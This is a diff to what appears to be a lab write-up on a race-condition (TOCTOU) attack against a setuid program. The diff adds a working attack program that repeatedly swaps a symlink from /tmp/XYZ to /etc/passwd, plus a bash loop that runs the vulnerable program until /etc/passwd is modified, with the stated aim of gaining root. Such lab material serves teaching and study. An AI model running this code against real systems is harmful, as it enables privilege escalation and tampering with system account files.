@@ -47,7 +47,7 @@ int main()
 }
 ```
 
-Internally, the verification in `A` will be in terms of the **Real UID**, and `B` using the **Effective UID**. The goal of this attack is to gain root privileges by exploring the race vulnerability. If we change the meaning of the `tmp/XYZ` file between this two instructions (due to non-atomic operations), using for instance UNIX symbolic link (symblink), we could access the `etc/passwd` file content and write stuff.
+Internally, the verification in `A` will be in terms of the **Real UID** (current user ID), and `B` using the **Effective UID** (temporary ID, ). The goal of this attack is to gain root privileges by exploring the race vulnerability. If we change the meaning of the `tmp/XYZ` file between this two instructions (due to non-atomic operations), using for instance UNIX symbolic link (symblink), we could access the `etc/passwd` file content and write stuff.
 
 To compile/run this vulnerable program:
 
@@ -73,17 +73,33 @@ With this line, we can gain access to the machine using a root user.
 
 ## The Real Attack
 
-We 
-
+race.c, the attack program:
 
 ```c
-
-
+#include <unistd.h>
+int main() {
+	while(1) {
+		unlink("/tmp/XYZ");
+		symlink("/etc/passwd","/tmp/XYZ");
+	}
+	return 0;
+}
 ```
 
 To run and monitoring the attack, we'll use this bash script:
 
 ```bash
-
-
+CHECK_FILE="ls -l /etc/passwd"
+old=$($CHECK_FILE)
+new=$($CHECK_FILE)
+while [ "$old" == "$new" ]          # Check if /etc/passwd is modified
+do
+    echo "your input" | ./vulp      # Run the vulnerable program
+    new=$($CHECK_FILE)
+done
+echo "STOP... The passwd file has been changed"
 ```
+
+We can run both programs in parallel in order to catch the expected result. 
+
+## Improved Attack Method
